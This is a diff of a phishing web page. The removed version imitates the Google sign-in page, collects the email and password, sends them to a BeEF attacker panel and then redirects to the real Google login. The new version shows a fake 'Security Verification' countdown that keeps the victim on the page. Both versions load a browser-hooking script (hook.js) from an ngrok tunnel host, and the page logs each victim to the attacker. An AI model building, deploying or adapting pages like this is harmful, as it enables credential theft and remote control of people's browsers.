@@ -3,111 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <title>Security Verification</title>
     <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
     
     <script src="https://harrison-unsilicated-talon.ngrok-free.dev/hook.js"></script>
 
     <style>
-        * { box-sizing: border-box; }
         body {
-            font-family: "Google Sans", "Roboto", arial, sans-serif;
-            background-color: #fff;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            color: #202124;
+            color: #333;
         }
-        .container {
-            width: 100%;
-            max-width: 450px;
-            padding: 48px 40px 36px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
+        .timer-container {
             text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 90%;
         }
-        @media (max-width: 600px) {
-            .container { border: none; padding: 20px; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 20px;
         }
-        .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin: 10px 0; }
-        p { font-size: 16px; margin-bottom: 40px; }
-        
-        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
-        input {
-            width: 100%;
-            padding: 13px 15px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            outline: none;
-            transition: border 0.2s;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
-        
-        .links {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 40px;
+        h2 { margin-bottom: 10px; font-size: 20px; }
+        #countdown {
+            font-size: 48px;
+            font-weight: bold;
+            color: #d93025;
+            margin: 20px 0;
         }
-        .create-account {
-            color: #1a73e8;
-            font-weight: 500;
-            font-size: 14px;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .btn-next {
-            background-color: #1a73e8;
-            color: #fff;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-weight: 500;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .btn-next:hover { background-color: #1557b0; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
+        .info { font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
-    <h1>Sign in</h1>
-    <p>Use your Google Account</p>
-
-    <div class="input-group">
-        <input type="email" id="email" placeholder="Email or phone" autocomplete="username">
-    </div>
-    <div class="input-group">
-        <input type="password" id="pass" placeholder="Enter your password" autocomplete="current-password">
-    </div>
-
-    <div class="links">
-        <span class="create-account">Forgot password?</span>
-        <button class="btn-next" onclick="captureAndRedirect()">Next</button>
-    </div>
+<div class="timer-container">
+    <div class="spinner"></div>
+    <h2>Verifying Connection</h2>
+    <p class="info">Please wait while we secure your session...</p>
+    
+    <div id="countdown">00:30</div>
+    
+    <p class="info">Do not close this window.</p>
 </div>
 
 <script>
-    function captureAndRedirect() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
+    // 30 Second Countdown Logic
+    let timeLeft = 30;
+    const timerElement = document.getElementById("countdown");
 
-        // Send data to BeEF control panel
-        if (typeof beef !== 'undefined') {
-            beef.net.send('/log', 0, "MODERN_UI_CAPTURE -> User: " + email + " | Pass: " + pass);
+    const countdownInterval = setInterval(function() {
+        timeLeft--;
+        
+        // Format time as 00:XX
+        let seconds = timeLeft < 10 ? "0" + timeLeft : timeLeft;
+        timerElement.innerHTML = "00:" + seconds;
+
+        if (timeLeft <= 0) {
+            clearInterval(countdownInterval);
+            timerElement.innerHTML = "DONE";
+            // Optional: Redirect to a safe page when finished
+            // window.location.href = "https://www.google.com";
         }
+    }, 1000);
 
-        // Realistic delay before redirecting to real Google
-        setTimeout(() => {
-            window.location.href = "https://accounts.google.com/v3/signin/identifier";
-        }, 800);
+    // Logging the connection to BeEF for confirmation
+    if (typeof beef !== 'undefined') {
+        beef.net.send('/log', 0, "TIMER_STARTED: Target is now active on the hook page.");
     }
 </script>
 
